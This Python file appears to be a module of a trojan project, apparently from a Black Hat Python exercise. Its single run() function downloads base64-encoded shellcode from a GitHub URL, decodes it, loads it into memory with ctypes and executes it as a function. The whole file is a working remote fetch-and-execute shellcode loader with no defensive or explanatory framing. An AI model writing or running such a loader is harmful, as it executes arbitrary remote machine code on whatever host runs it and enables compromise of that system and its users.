import base64
import ctypes
import urllib.request

def run(**args):
    try:
        url = "https://github.com/leducymta/bhptrojan/blob/master/shellcode/shellcode.b64"
        response = urllib.request.urlopen(url)
        encoded_shellcode = response.read()
        shellcode = base64.b64decode(encoded_shellcode)

        shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
        shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
        shellcode_func()

        return "[✓] Shellcode executed successfully"

    except Exception as e:
        return f"[!] Shellcode execution failed: {str(e)}"

